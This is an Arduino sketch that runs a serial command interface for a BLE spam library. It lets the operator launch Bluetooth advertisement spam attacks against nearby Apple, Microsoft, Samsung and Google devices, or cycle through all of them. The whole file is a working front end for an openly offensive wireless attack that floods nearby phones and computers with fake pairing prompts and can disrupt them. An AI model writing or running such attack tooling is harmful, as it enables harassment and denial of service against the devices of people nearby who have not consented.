#include <Arduino.h>
#include <BleSpam.h>

BleSpam bleSpammer;

void print_help() {
  Serial.println("\nAvailable commands:");
  Serial.println("  start apple           - Start AppleJuice/SourApple spam");
  Serial.println("  start microsoft       - Start Microsoft SwiftPair spam");
  Serial.println("  start samsung         - Start Samsung spam");
  Serial.println("  start google          - Start Google FastPair spam");
  Serial.println("  start all             - Cycle through all spam types");
  Serial.println("  start custom <name>   - Start spam with a custom name");
  Serial.println("  stop                  - Stop any running spam attack");
  Serial.println("  status                - Check if an attack is running");
  Serial.println("  help                  - Show this help message");
  Serial.print("> ");
}

void setup() {
  Serial.begin(115200);
  while (!Serial); // Wait for Serial to be ready
  randomSeed(analogRead(0));
  print_help();
}

void loop() {
  if (Serial.available() > 0) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    Serial.println(command);

    if (command.startsWith("start ")) {
      String type = command.substring(6);
      if (type == "apple") {
        Serial.println("Starting Apple spam...");
        bleSpammer.start(BleSpam::AppleJuice);
      } else if (type == "microsoft") {
        Serial.println("Starting Microsoft spam...");
        bleSpammer.start(BleSpam::Microsoft);
      } else if (type == "samsung") {
        Serial.println("Starting Samsung spam...");
        bleSpammer.start(BleSpam::Samsung);
      } else if (type == "google") {
        Serial.println("Starting Google spam...");
        bleSpammer.start(BleSpam::Google);
      } else if (type == "all") {
        Serial.println("Starting to cycle all spam types...");
        bleSpammer.startAll();
      } else if (type.startsWith("custom ")) {
        String name = type.substring(7);
        Serial.println("Starting custom spam with name: " + name);
        bleSpammer.startCustom(name);
      } else {
        Serial.println("Unknown spam type.");
      }
    } else if (command == "stop") {
      Serial.println("Stopping spam...");
      bleSpammer.stop();
      Serial.println("Spam stopped.");
    } else if (command == "status") {
      if (bleSpammer.isRunning()) {
        Serial.println("Spam attack is currently RUNNING.");
      } else {
        Serial.println("Spam attack is STOPPED.");
      }
    } else if (command == "help") {
      print_help();
    } else if (command.length() > 0) {
      Serial.println("Unknown command.");
      print_help();
    }
     if(command.length() > 0) Serial.print("> ");
  }
}